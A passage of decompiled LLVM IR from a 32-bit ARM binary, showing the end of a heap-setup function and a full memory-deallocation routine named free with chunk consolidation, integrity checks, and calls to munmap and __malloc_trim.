  %v2_1c694 = inttoptr i32 %v1_1c694 to i32*
  %v3_1c694 = load i32, i32* %v2_1c694, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1c69c = urem i32 %v2_1c690, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_1c6a4 = or i32 %v3_1c694, 1
  store i32 %v1_1c6a4, i32* %r1.global-to-local, align 4
  %v1_1c6a8 = or i32 %v1_1c69c, 72
  store i32 %v1_1c6a8, i32* %r2.global-to-local, align 4
  %v1_1c6ac = add i32 %v0_1c690, 52
  store i32 %v1_1c6ac, i32* %ip.global-to-local, align 4
  %v2_1c6b0 = add i32 %v0_1c690, 840
  %v3_1c6b0 = inttoptr i32 %v2_1c6b0 to i32*
  store i32 0, i32* %v3_1c6b0, align 4
  %v0_1c6b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c6b4 = add i32 %v0_1c6b4, 65536
  store i32 %v1_1c6b4, i32* %r3.global-to-local, align 4
  %v0_1c6b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c6b8 = load i32, i32* @r4, align 4
  %v2_1c6b8 = add i32 %v1_1c6b8, 836
  %v3_1c6b8 = inttoptr i32 %v2_1c6b8 to i32*
  store i32 %v0_1c6b8, i32* %v3_1c6b8, align 4
  %v0_1c6bc = load i32, i32* %r0.global-to-local, align 4
  %v1_1c6bc = load i32, i32* @r4, align 4
  %v2_1c6bc = add i32 %v1_1c6bc, 844
  %v3_1c6bc = inttoptr i32 %v2_1c6bc to i32*
  store i32 %v0_1c6bc, i32* %v3_1c6bc, align 4
  %v1_1c6c0 = load i32, i32* @r4, align 4
  %v2_1c6c0 = add i32 %v1_1c6c0, 852
  %v3_1c6c0 = inttoptr i32 %v2_1c6c0 to i32*
  store i32 %v1_1c6b4, i32* %v3_1c6c0, align 4
  %v1_1c6c4 = load i32, i32* @r4, align 4
  %v2_1c6c4 = add i32 %v1_1c6c4, 864
  %v3_1c6c4 = inttoptr i32 %v2_1c6c4 to i32*
  store i32 %v1_1c6a4, i32* %v3_1c6c4, align 4
  %v1_1c6c8 = load i32, i32* @r4, align 4
  %v2_1c6c8 = inttoptr i32 %v1_1c6c8 to i32*
  store i32 %v1_1c6a8, i32* %v2_1c6c8, align 4
  %v0_1c6cc = load i32, i32* %ip.global-to-local, align 4
  %v1_1c6cc = load i32, i32* @r4, align 4
  %v2_1c6cc = add i32 %v1_1c6cc, 44
  %v3_1c6cc = inttoptr i32 %v2_1c6cc to i32*
  store i32 %v0_1c6cc, i32* %v3_1c6cc, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_1c6d4 = call i32 @sysconf(i32 30, i32 %v1_1c6a4, i32 %v1_1c6a8, i32 %v1_1c6b4)
  store i32 %v4_1c6d4, i32* @r0, align 4
  %v1_1c6d8 = load i32, i32* @r4, align 4
  %v2_1c6d8 = add i32 %v1_1c6d8, 860
  %v3_1c6d8 = inttoptr i32 %v2_1c6d8 to i32*
  store i32 %v4_1c6d4, i32* %v3_1c6d8, align 4
  br label %dec_label_pc_1c6dc

dec_label_pc_1c6dc:                               ; preds = %dec_label_pc_1c664, %dec_label_pc_1c690
  %v2_1c6e0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1c6e0, i32* @r4, align 4
  %v1_1c6e4 = load i32, i32* @r0, align 4
  ret i32 %v1_1c6e4

; uselistorder directives
  uselistorder i32 %v0_1c690, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1c688, { 1, 0 }
  uselistorder i32 %v1_1c66c, { 1, 0 }
  uselistorder i32 %v0_1c658, { 0, 2, 1 }
  uselistorder i32 %v0_1c634, { 1, 0 }
  uselistorder i32 %v1_1c584, { 1, 0, 2 }
  uselistorder i32 %v0_1c59c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1c55c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 3, 10, 4, 5, 6, 7, 8, 0, 1, 2, 9 }
  uselistorder label %dec_label_pc_1c6dc, { 1, 0 }
  uselistorder label %dec_label_pc_1c674.dec_label_pc_1c674_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1c658, { 1, 0 }
  uselistorder label %dec_label_pc_1c624, { 1, 0 }
  uselistorder label %dec_label_pc_1c618, { 1, 0 }
  uselistorder label %dec_label_pc_1c614, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c5d0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1c6e8 = load i32, i32* @r4, align 4
  %v6_1c6e8 = load i32, i32* @r5, align 4
  %v9_1c6e8 = load i32, i32* @r6, align 4
  %v12_1c6e8 = load i32, i32* @r7, align 4
  %v18_1c6e8 = load i32, i32* @lr, align 4
  %v0_1c6f0 = load i32, i32* @r0, align 4
  store i32 %v0_1c6f0, i32* @r6, align 4
  %v2_1c6f0 = icmp eq i32 %v0_1c6f0, 0
  %v2_1c6f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r7, align 4
  br i1 %v2_1c6f0, label %dec_label_pc_1c8fc, label %dec_label_pc_1c700

dec_label_pc_1c700:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_1c704 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 108) to i32*), align 4
  store i32 %v4_1c704, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_1c704, i32* %r2.global-to-local, align 4
  %v4_1c710 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 68) to i32*), align 4
  store i32 %v4_1c710, i32* %r1.global-to-local, align 4
  store i32 %v2_1c6f4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1c71c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 112) to i32*), align 4
  store i32 %v4_1c71c, i32* %ip.global-to-local, align 4
  store i32 116520, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1c71c)
  %v0_1c728 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1c728, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1c730 = load i32, i32* @r7, align 4
  %v2_1c730 = add i32 %v0_1c730, 16
  %v3_1c730 = inttoptr i32 %v2_1c730 to i32*
  %v4_1c730 = load i32, i32* %v3_1c730, align 4
  store i32 %v4_1c730, i32* %ip.global-to-local, align 4
  store i32 116540, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1c730)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1c740 = load i32, i32* @r7, align 4
  %v2_1c740 = add i32 %v0_1c740, 64
  %v3_1c740 = inttoptr i32 %v2_1c740 to i32*
  %v4_1c740 = load i32, i32* %v3_1c740, align 4
  store i32 %v4_1c740, i32* @lr, align 4
  %v0_1c744 = load i32, i32* @r6, align 4
  %v1_1c744 = add i32 %v0_1c744, -4
  %v2_1c744 = inttoptr i32 %v1_1c744 to i32*
  %v3_1c744 = load i32, i32* %v2_1c744, align 4
  store i32 %v3_1c744, i32* %r2.global-to-local, align 4
  %v1_1c748 = inttoptr i32 %v4_1c740 to i32*
  %v2_1c748 = load i32, i32* %v1_1c748, align 4
  store i32 %v2_1c748, i32* %r3.global-to-local, align 4
  %v1_1c74c = and i32 %v3_1c744, -4
  store i32 %v1_1c74c, i32* %ip.global-to-local, align 4
  %v1_1c750 = add i32 %v0_1c744, -8
  store i32 %v1_1c750, i32* @r5, align 4
  store i32 %v1_1c750, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1c74c, %v2_1c748
  br i1 %tmp, label %dec_label_pc_1c780, label %dec_label_pc_1c760

dec_label_pc_1c760:                               ; preds = %dec_label_pc_1c700
  %v1_1c760 = or i32 %v2_1c748, 3
  store i32 %v1_1c760, i32* %r3.global-to-local, align 4
  store i32 %v1_1c760, i32* %v1_1c748, align 4
  %v3_1c764 = load i32, i32* @lr, align 4
  %v4_1c764 = add i32 %v3_1c764, -8
  store i32 %v4_1c764, i32* %lr.global-to-local, align 4
  %v0_1c768 = load i32, i32* %ip.global-to-local, align 4
  %v3_1c768 = udiv i32 %v0_1c768, 8
  store i32 %v3_1c768, i32* %r1.global-to-local, align 4
  %v1_1c76c = add i32 %v3_1c764, -4
  store i32 %v1_1c76c, i32* %r2.global-to-local, align 4
  %v4_1c770 = mul nuw i32 %v3_1c768, 4
  %v5_1c770 = add i32 %v4_1c770, %v1_1c76c
  %v6_1c770 = inttoptr i32 %v5_1c770 to i32*
  %v7_1c770 = load i32, i32* %v6_1c770, align 4
  store i32 %v7_1c770, i32* %r3.global-to-local, align 4
  %v1_1c774 = load i32, i32* @r5, align 4
  %v2_1c774 = add i32 %v1_1c774, 8
  %v3_1c774 = inttoptr i32 %v2_1c774 to i32*
  store i32 %v7_1c770, i32* %v3_1c774, align 4
  %v0_1c778 = load i32, i32* @r5, align 4
  %v1_1c778 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c778 = load i32, i32* %r1.global-to-local, align 4
  %v5_1c778 = mul i32 %v2_1c778, 4
  %v6_1c778 = add i32 %v5_1c778, %v1_1c778
  %v7_1c778 = inttoptr i32 %v6_1c778 to i32*
  store i32 %v0_1c778, i32* %v7_1c778, align 4
  br label %dec_label_pc_1c8e4

dec_label_pc_1c780:                               ; preds = %dec_label_pc_1c700
  %v1_1c780 = and i32 %v3_1c744, 2
  %v2_1c780 = icmp eq i32 %v1_1c780, 0
  br i1 %v2_1c780, label %dec_label_pc_1c788, label %dec_label_pc_1c8bc

dec_label_pc_1c788:                               ; preds = %dec_label_pc_1c780
  %v1_1c788 = or i32 %v2_1c748, 1
  store i32 %v1_1c788, i32* %r3.global-to-local, align 4
  store i32 %v1_1c788, i32* %v1_1c748, align 4
  %v0_1c790 = load i32, i32* @r6, align 4
  %v1_1c790 = add i32 %v0_1c790, -4
  %v2_1c790 = inttoptr i32 %v1_1c790 to i32*
  %v3_1c790 = load i32, i32* %v2_1c790, align 4
  store i32 %v3_1c790, i32* %r3.global-to-local, align 4
  %v0_1c794 = load i32, i32* @r5, align 4
  %v1_1c794 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c794 = add i32 %v1_1c794, %v0_1c794
  store i32 %v2_1c794, i32* %lr.global-to-local, align 4
  %v1_1c798 = urem i32 %v3_1c790, 2
  %v2_1c798 = icmp eq i32 %v1_1c798, 0
  %v1_1c79c = add i32 %v2_1c794, 4
  %v2_1c79c = inttoptr i32 %v1_1c79c to i32*
  %v3_1c79c = load i32, i32* %v2_1c79c, align 4
  store i32 %v3_1c79c, i32* %r8.global-to-local, align 4
  br i1 %v2_1c798, label %dec_label_pc_1c7a4, label %dec_label_pc_1c7d8

dec_label_pc_1c7a4:                               ; preds = %dec_label_pc_1c788
  %v1_1c7a4 = add i32 %v0_1c790, -8
  %v2_1c7a4 = inttoptr i32 %v1_1c7a4 to i32*
  %v3_1c7a4 = load i32, i32* %v2_1c7a4, align 4
  store i32 %v3_1c7a4, i32* %r1.global-to-local, align 4
  %v2_1c7a8 = sub i32 %v0_1c794, %v3_1c7a4
  store i32 %v2_1c7a8, i32* %r3.global-to-local, align 4
  %v1_1c7ac = add i32 %v2_1c7a8, 8
  %v2_1c7ac = inttoptr i32 %v1_1c7ac to i32*
  %v3_1c7ac = load i32, i32* %v2_1c7ac, align 4
  store i32 %v3_1c7ac, i32* %r2.global-to-local, align 4
  %v1_1c7b0 = add i32 %v3_1c7ac, 12
  %v2_1c7b0 = inttoptr i32 %v1_1c7b0 to i32*
  %v3_1c7b0 = load i32, i32* %v2_1c7b0, align 4
  store i32 %v3_1c7b0, i32* %r4.global-to-local, align 4
  %v9_1c7b4 = icmp eq i32 %v3_1c7b0, %v2_1c7a8
  %v1_1c7b8 = add i32 %v2_1c7a8, 12
  %v2_1c7b8 = inttoptr i32 %v1_1c7b8 to i32*
  %v3_1c7b8 = load i32, i32* %v2_1c7b8, align 4
  store i32 %v3_1c7b8, i32* %r0.global-to-local, align 4
  br i1 %v9_1c7b4, label %dec_label_pc_1c7c0, label %dec_label_pc_1c824

dec_label_pc_1c7c0:                               ; preds = %dec_label_pc_1c7a4
  %v1_1c7c0 = add i32 %v3_1c7b8, 8
  %v2_1c7c0 = inttoptr i32 %v1_1c7c0 to i32*
  %v3_1c7c0 = load i32, i32* %v2_1c7c0, align 4
  store i32 %v3_1c7c0, i32* %r3.global-to-local, align 4
  %v9_1c7c4 = icmp eq i32 %v3_1c7c0, %v2_1c7a8
  br i1 %v9_1c7c4, label %dec_label_pc_1c7cc, label %dec_label_pc_1c824

dec_label_pc_1c7cc:                               ; preds = %dec_label_pc_1c7c0
  store i32 %v3_1c7ac, i32* %v2_1c7c0, align 4
  %v0_1c7d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c7d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c7d0 = add i32 %v1_1c7d0, 12
  %v3_1c7d0 = inttoptr i32 %v2_1c7d0 to i32*
  store i32 %v0_1c7d0, i32* %v3_1c7d0, align 4
  %v0_1c7d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c7d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c7d4 = add i32 %v1_1c7d4, %v0_1c7d4
  store i32 %v2_1c7d4, i32* %ip.global-to-local, align 4
  %v0_1c7e4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1c7e8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c7d8

dec_label_pc_1c7d8:                               ; preds = %dec_label_pc_1c788, %dec_label_pc_1c7cc
  %v0_1c864 = phi i32 [ %v1_1c794, %dec_label_pc_1c788 ], [ %v2_1c7d4, %dec_label_pc_1c7cc ]
  %v0_1c7e8 = phi i32 [ %v3_1c79c, %dec_label_pc_1c788 ], [ %v0_1c7e8.pre, %dec_label_pc_1c7cc ]
  %v1_1c7fc = phi i32 [ %v2_1c794, %dec_label_pc_1c788 ], [ %v0_1c7e4.pre, %dec_label_pc_1c7cc ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1c7dc = load i32, i32* @r7, align 4
  %v2_1c7dc = add i32 %v0_1c7dc, 64
  %v3_1c7dc = inttoptr i32 %v2_1c7dc to i32*
  %v4_1c7dc = load i32, i32* %v3_1c7dc, align 4
  store i32 %v4_1c7dc, i32* %r2.global-to-local, align 4
  %v1_1c7e0 = add i32 %v4_1c7dc, 44
  %v2_1c7e0 = inttoptr i32 %v1_1c7e0 to i32*
  %v3_1c7e0 = load i32, i32* %v2_1c7e0, align 4
  store i32 %v3_1c7e0, i32* %r3.global-to-local, align 4
  %v9_1c7e4 = icmp eq i32 %v1_1c7fc, %v3_1c7e0
  %v1_1c7e8 = and i32 %v0_1c7e8, -4
  store i32 %v1_1c7e8, i32* %r0.global-to-local, align 4
  br i1 %v9_1c7e4, label %dec_label_pc_1c864, label %dec_label_pc_1c7f0

dec_label_pc_1c7f0:                               ; preds = %dec_label_pc_1c7d8
  %v2_1c7f0 = add i32 %v1_1c7fc, %v1_1c7e8
  store i32 %v2_1c7f0, i32* %r3.global-to-local, align 4
  %v1_1c7f4 = add i32 %v2_1c7f0, 4
  %v2_1c7f4 = inttoptr i32 %v1_1c7f4 to i32*
  %v3_1c7f4 = load i32, i32* %v2_1c7f4, align 4
  store i32 %v3_1c7f4, i32* %r3.global-to-local, align 4
  %v1_1c7f8 = urem i32 %v3_1c7f4, 2
  %v2_1c7f8 = icmp eq i32 %v1_1c7f8, 0
  %v2_1c7fc = add i32 %v1_1c7fc, 4
  %v3_1c7fc = inttoptr i32 %v2_1c7fc to i32*
  store i32 %v1_1c7e8, i32* %v3_1c7fc, align 4
  br i1 %v2_1c7f8, label %dec_label_pc_1c804, label %dec_label_pc_1c7f0.dec_label_pc_1c834_crit_edge

dec_label_pc_1c7f0.dec_label_pc_1c834_crit_edge:  ; preds = %dec_label_pc_1c7f0
  %v0_1c844.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1c834

dec_label_pc_1c804:                               ; preds = %dec_label_pc_1c7f0
  %v0_1c804 = load i32, i32* %lr.global-to-local, align 4
  %v1_1c804 = add i32 %v0_1c804, 8
  %v2_1c804 = inttoptr i32 %v1_1c804 to i32*
  %v3_1c804 = load i32, i32* %v2_1c804, align 4
  store i32 %v3_1c804, i32* %r1.global-to-local, align 4
  %v1_1c808 = add i32 %v3_1c804, 12
  %v2_1c808 = inttoptr i32 %v1_1c808 to i32*
  %v3_1c808 = load i32, i32* %v2_1c808, align 4
  store i32 %v3_1c808, i32* %r3.global-to-local, align 4
  %v9_1c80c = icmp eq i32 %v3_1c808, %v0_1c804
  %v1_1c810 = add i32 %v0_1c804, 12
  %v2_1c810 = inttoptr i32 %v1_1c810 to i32*
  %v3_1c810 = load i32, i32* %v2_1c810, align 4
  store i32 %v3_1c810, i32* %r2.global-to-local, align 4
  br i1 %v9_1c80c, label %dec_label_pc_1c818, label %dec_label_pc_1c824

dec_label_pc_1c818:                               ; preds = %dec_label_pc_1c804
  %v1_1c818 = add i32 %v3_1c810, 8
  %v2_1c818 = inttoptr i32 %v1_1c818 to i32*
  %v3_1c818 = load i32, i32* %v2_1c818, align 4
  store i32 %v3_1c818, i32* %r3.global-to-local, align 4
  %v9_1c81c = icmp eq i32 %v3_1c818, %v0_1c804
  br i1 %v9_1c81c, label %dec_label_pc_1c828, label %dec_label_pc_1c824

dec_label_pc_1c824:                               ; preds = %dec_label_pc_1c804, %dec_label_pc_1c7c0, %dec_label_pc_1c7a4, %dec_label_pc_1c818
  %v0_1c824 = call i32 @abort()
  store i32 %v0_1c824, i32* %r0.global-to-local, align 4
  %v0_1c828.pre = load i32, i32* @r1, align 4
  %v1_1c828.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1c828

dec_label_pc_1c828:                               ; preds = %dec_label_pc_1c818, %dec_label_pc_1c824
  %v1_1c828 = phi i32 [ %v3_1c810, %dec_label_pc_1c818 ], [ %v1_1c828.pre, %dec_label_pc_1c824 ]
  %v0_1c828 = phi i32 [ %v3_1c804, %dec_label_pc_1c818 ], [ %v0_1c828.pre, %dec_label_pc_1c824 ]
  %v2_1c828 = add i32 %v1_1c828, 8
  %v3_1c828 = inttoptr i32 %v2_1c828 to i32*
  store i32 %v0_1c828, i32* %v3_1c828, align 4
  %v0_1c82c = load i32, i32* %r2.global-to-local, align 4
  %v1_1c82c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c82c = add i32 %v1_1c82c, 12
  %v3_1c82c = inttoptr i32 %v2_1c82c to i32*
  store i32 %v0_1c82c, i32* %v3_1c82c, align 4
  %v0_1c830 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c830 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c830 = add i32 %v1_1c830, %v0_1c830
  store i32 %v2_1c830, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1c834

dec_label_pc_1c834:                               ; preds = %dec_label_pc_1c7f0.dec_label_pc_1c834_crit_edge, %dec_label_pc_1c828
  %v0_1c844 = phi i32 [ %v0_1c844.pre, %dec_label_pc_1c7f0.dec_label_pc_1c834_crit_edge ], [ %v2_1c830, %dec_label_pc_1c828 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1c838 = load i32, i32* @r7, align 4
  %v2_1c838 = add i32 %v0_1c838, 64
  %v3_1c838 = inttoptr i32 %v2_1c838 to i32*
  %v4_1c838 = load i32, i32* %v3_1c838, align 4
  %v1_1c83c = add i32 %v4_1c838, 52
  store i32 %v1_1c83c, i32* %r3.global-to-local, align 4
  %v1_1c840 = add i32 %v4_1c838, 60
  %v2_1c840 = inttoptr i32 %v1_1c840 to i32*
  %v3_1c840 = load i32, i32* %v2_1c840, align 4
  store i32 %v3_1c840, i32* %r1.global-to-local, align 4
  %v1_1c844 = or i32 %v0_1c844, 1
  store i32 %v1_1c844, i32* %r2.global-to-local, align 4
  %v1_1c848 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c848 = add i32 %v1_1c848, 12
  %v3_1c848 = inttoptr i32 %v2_1c848 to i32*
  store i32 %v1_1c83c, i32* %v3_1c848, align 4
  %v0_1c84c = load i32, i32* %r1.global-to-local, align 4
  %v1_1c84c = load i32, i32* %r4.global-to-local, align 4
  %v2_1c84c = add i32 %v1_1c84c, 8
  %v3_1c84c = inttoptr i32 %v2_1c84c to i32*
  store i32 %v0_1c84c, i32* %v3_1c84c, align 4
  %v0_1c850 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c850 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c850 = add i32 %v1_1c850, 4
  %v3_1c850 = inttoptr i32 %v2_1c850 to i32*
  store i32 %v0_1c850, i32* %v3_1c850, align 4
  %v0_1c854 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c854 = load i32, i32* %r4.global-to-local, align 4
  %v3_1c854 = add i32 %v1_1c854, %v0_1c854
  %v4_1c854 = inttoptr i32 %v3_1c854 to i32*
  store i32 %v0_1c854, i32* %v4_1c854, align 4
  %v0_1c858 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c858 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c858 = add i32 %v1_1c858, 12
  %v3_1c858 = inttoptr i32 %v2_1c858 to i32*
  store i32 %v0_1c858, i32* %v3_1c858, align 4
  %v0_1c85c = load i32, i32* %r4.global-to-local, align 4
  %v1_1c85c = load i32, i32* %r3.global-to-local, align 4
  %v2_1c85c = add i32 %v1_1c85c, 8
  %v3_1c85c = inttoptr i32 %v2_1c85c to i32*
  store i32 %v0_1c85c, i32* %v3_1c85c, align 4
  br label %dec_label_pc_1c874

dec_label_pc_1c864:                               ; preds = %dec_label_pc_1c7d8
  %v2_1c864 = add i32 %v1_1c7e8, %v0_1c864
  store i32 %v2_1c864, i32* %ip.global-to-local, align 4
  %v1_1c868 = or i32 %v2_1c864, 1
  store i32 %v1_1c868, i32* %r3.global-to-local, align 4
  %v0_1c86c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1c86c, i32* %v2_1c7e0, align 4
  %v0_1c870 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c870 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c870 = add i32 %v1_1c870, 4
  %v3_1c870 = inttoptr i32 %v2_1c870 to i32*
  store i32 %v0_1c870, i32* %v3_1c870, align 4
  br label %dec_label_pc_1c874

dec_label_pc_1c874:                               ; preds = %dec_label_pc_1c834, %dec_label_pc_1c864
  %v0_1c874 = load i32, i32* %ip.global-to-local, align 4
  %v3_1c878 = icmp ult i32 %v0_1c874, 131070
  br i1 %v3_1c878, label %dec_label_pc_1c8e4, label %dec_label_pc_1c87c

dec_label_pc_1c87c:                               ; preds = %dec_label_pc_1c874
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1c880 = load i32, i32* @r7, align 4
  %v2_1c880 = add i32 %v0_1c880, 64
  %v3_1c880 = inttoptr i32 %v2_1c880 to i32*
  %v4_1c880 = load i32, i32* %v3_1c880, align 4
  store i32 %v4_1c880, i32* @r4, align 4
  %v1_1c884 = inttoptr i32 %v4_1c880 to i32*
  %v2_1c884 = load i32, i32* %v1_1c884, align 4
  store i32 %v2_1c884, i32* %r3.global-to-local, align 4
  %v1_1c888 = and i32 %v2_1c884, 2
  %v2_1c888 = icmp eq i32 %v1_1c888, 0
  br i1 %v2_1c888, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1c87c
  store i32 %v4_1c880, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1c87c, %bb
  %v1_1c890 = xor i1 %v2_1c888, true
  call void @__pseudo_cond_branch(i1 %v1_1c890, i32 ptrtoint (i32* @global_var_1c534.529 to i32))
  %v0_1c894 = load i32, i32* @r4, align 4
  %v1_1c894 = add i32 %v0_1c894, 44
  %v2_1c894 = inttoptr i32 %v1_1c894 to i32*
  %v3_1c894 = load i32, i32* %v2_1c894, align 4
  store i32 %v3_1c894, i32* %r3.global-to-local, align 4
  %v1_1c898 = add i32 %v3_1c894, 4
  %v2_1c898 = inttoptr i32 %v1_1c898 to i32*
  %v3_1c898 = load i32, i32* %v2_1c898, align 4
  store i32 %v3_1c898, i32* %r3.global-to-local, align 4
  %v1_1c89c = add i32 %v0_1c894, 836
  %v2_1c89c = inttoptr i32 %v1_1c89c to i32*
  %v3_1c89c = load i32, i32* %v2_1c89c, align 4
  store i32 %v3_1c89c, i32* %r2.global-to-local, align 4
  %v1_1c8a0 = and i32 %v3_1c898, -4
  store i32 %v1_1c8a0, i32* %r3.global-to-local, align 4
  %v3_1c8a4 = icmp ult i32 %v1_1c8a0, %v3_1c89c
  br i1 %v3_1c8a4, label %dec_label_pc_1c8e4, label %dec_label_pc_1c8ac

dec_label_pc_1c8ac:                               ; preds = %bb17
  store i32 %v0_1c894, i32* %r1.global-to-local, align 4
  %v1_1c8b0 = add i32 %v0_1c894, 840
  %v2_1c8b0 = inttoptr i32 %v1_1c8b0 to i32*
  %v3_1c8b0 = load i32, i32* %v2_1c8b0, align 4
  store i32 %v3_1c8b0, i32* %r0.global-to-local, align 4
  %v2_1c8b4 = call i32 @__malloc_trim(i32 %v3_1c8b0, i32 %v0_1c894)
  store i32 %v2_1c8b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c8e4

dec_label_pc_1c8bc:                               ; preds = %dec_label_pc_1c780
  %v2_1c8bc = inttoptr i32 %v1_1c750 to i32*
  %v3_1c8bc = load i32, i32* %v2_1c8bc, align 4
  store i32 %v3_1c8bc, i32* %r0.global-to-local, align 4
  %v1_1c8c0 = add i32 %v4_1c740, 848
  %v2_1c8c0 = inttoptr i32 %v1_1c8c0 to i32*
  %v3_1c8c0 = load i32, i32* %v2_1c8c0, align 4
  store i32 %v3_1c8c0, i32* %r2.global-to-local, align 4
  %v1_1c8c4 = add i32 %v4_1c740, 868
  %v2_1c8c4 = inttoptr i32 %v1_1c8c4 to i32*
  %v3_1c8c4 = load i32, i32* %v2_1c8c4, align 4
  %v2_1c8c8 = add i32 %v3_1c8bc, %v1_1c74c
  store i32 %v2_1c8c8, i32* %r1.global-to-local, align 4
  %v1_1c8cc = add i32 %v3_1c8c0, -1
  store i32 %v1_1c8cc, i32* %r2.global-to-local, align 4
  %v2_1c8d0 = sub i32 %v3_1c8c4, %v2_1c8c8
  store i32 %v2_1c8d0, i32* %r3.global-to-local, align 4
  store i32 %v2_1c8d0, i32* %v2_1c8c4, align 4
  %v1_1c8d8 = load i32, i32* @lr, align 4
  %v2_1c8d8 = add i32 %v1_1c8d8, 848
  %v3_1c8d8 = inttoptr i32 %v2_1c8d8 to i32*
  store i32 %v1_1c8cc, i32* %v3_1c8d8, align 4
  %v0_1c8dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1c8dc = load i32, i32* @r5, align 4
  %v2_1c8dc = sub i32 %v1_1c8dc, %v0_1c8dc
  store i32 %v2_1c8dc, i32* %r0.global-to-local, align 4
  %v4_1c8e0 = call i32 @munmap(i32 %v2_1c8dc, i32 %v2_1c8c8, i32 %v1_1c8cc, i32 %v2_1c8d0)
  store i32 %v4_1c8e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c8e4

dec_label_pc_1c8e4:                               ; preds = %bb17, %dec_label_pc_1c874, %dec_label_pc_1c8ac, %dec_label_pc_1c760, %dec_label_pc_1c8bc
  store i32 %v2_1c6f4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_1c8f0 = load i32, i32* @r7, align 4
  %v2_1c8f0 = add i32 %v0_1c8f0, 44
  %v3_1c8f0 = inttoptr i32 %v2_1c8f0 to i32*
  %v4_1c8f0 = load i32, i32* %v3_1c8f0, align 4
  store i32 %v4_1c8f0, i32* %ip.global-to-local, align 4
  store i32 116988, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1c8f0)
  br label %dec_label_pc_1c8fc

dec_label_pc_1c8fc:                               ; preds = %entry, %dec_label_pc_1c8e4
  store i32 %v3_1c6e8, i32* @r4, align 4
  store i32 %v6_1c6e8, i32* @r5, align 4
  store i32 %v9_1c6e8, i32* @r6, align 4
  store i32 %v12_1c6e8, i32* @r7, align 4
  store i32 %v18_1c6e8, i32* @lr, align 4
  ret i32 %v2_1c6f4

; uselistorder directives
  uselistorder i32 %v0_1c894, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1c854, { 1, 0 }
  uselistorder i32 %v1_1c794, { 1, 0 }
  uselistorder i32 %v0_1c794, { 1, 0 }
  uselistorder i32 %v3_1c768, { 1, 0 }
